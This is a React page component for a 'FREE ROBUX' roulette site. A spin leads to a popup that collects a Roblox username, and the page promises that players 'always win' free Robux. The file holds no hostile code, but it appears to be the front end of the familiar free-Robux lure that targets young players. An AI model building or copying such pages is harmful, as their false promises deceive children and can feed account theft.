import { useState } from "react";
import { Button } from "@/components/ui/button";
import { RouletteWheel } from "@/components/RouletteWheel";
import { RobloxPopup } from "@/components/RobloxPopup";
import { SuccessPopup } from "@/components/SuccessPopup";
import { cn } from "@/lib/utils";

export default function Index() {
  const [isSpinning, setIsSpinning] = useState(false);
  const [showRobloxPopup, setShowRobloxPopup] = useState(false);
  const [showSuccessPopup, setShowSuccessPopup] = useState(false);
  const [robuxWon, setRobuxWon] = useState<number>(0);
  const [submittedUsername, setSubmittedUsername] = useState<string>("");

  const handleSpin = () => {
    if (!isSpinning) {
      setIsSpinning(true);
    }
  };

  const handleSpinComplete = (robuxAmount: number) => {
    setIsSpinning(false);
    setRobuxWon(robuxAmount);
    setShowRobloxPopup(true);
  };

  const handleRobloxSubmit = (username: string) => {
    setSubmittedUsername(username);
    setShowRobloxPopup(false);
    setShowSuccessPopup(true);
  };

  const handleRobloxClose = () => {
    setShowRobloxPopup(false);
  };

  return (
    <div className="fixed inset-0 bg-gradient-to-br from-gray-900 via-gray-800 to-gray-900 overflow-hidden">
      {/* Background decoration */}
      <div className="absolute inset-0 bg-[radial-gradient(circle_at_center,rgba(255,215,0,0.1)_0%,transparent_70%)]"></div>
      
      {/* Main content - perfectly centered */}
      <div className="absolute inset-0 flex items-center justify-center">
        <div className="flex flex-col items-center space-y-8">
          {/* Title */}
          <div className="text-center">
            <h1 className="text-6xl md:text-8xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-yellow-400 via-yellow-300 to-yellow-500 mb-2">
              🎰 FREE ROBUX
            </h1>
            <p className="text-xl text-gray-300">
              Spin the wheel and win Robux instantly!
            </p>
          </div>

          {/* Roulette Wheel - centered */}
          <div className="relative">
            <RouletteWheel
              onSpinComplete={handleSpinComplete}
              isSpinning={isSpinning}
            />
          </div>
          
          {/* Spin Button */}
          <Button
            size="lg"
            className={cn(
              "px-12 py-4 text-2xl font-bold transition-all duration-200 bg-gradient-to-r from-yellow-400 to-yellow-500 hover:from-yellow-500 hover:to-yellow-600 text-gray-900 shadow-lg hover:shadow-xl transform hover:scale-105 active:scale-95 border-2 border-yellow-300",
              isSpinning && "opacity-75 cursor-not-allowed"
            )}
            onClick={handleSpin}
            disabled={isSpinning}
          >
            {isSpinning ? "🎰 SPINNING..." : "🎯 SPIN FOR FREE ROBUX!"}
          </Button>

          {isSpinning && (
            <div className="text-center animate-pulse">
              <div className="text-lg text-yellow-400 font-semibold">
                🎲 Good luck! You always win Robux!
              </div>
            </div>
          )}
        </div>
      </div>

      {/* Footer info */}
      <div className="absolute bottom-8 left-1/2 transform -translate-x-1/2 text-center">
        <div className="text-sm text-gray-500">
          🎮 100% Free • Unlimited Spins • Always Win!
        </div>
      </div>

      {/* Popups */}
      <RobloxPopup
        isOpen={showRobloxPopup}
        robuxAmount={robuxWon}
        onClose={handleRobloxClose}
        onSubmit={handleRobloxSubmit}
      />

      <SuccessPopup
        isOpen={showSuccessPopup}
        username={submittedUsername}
      />
    </div>
  );
}
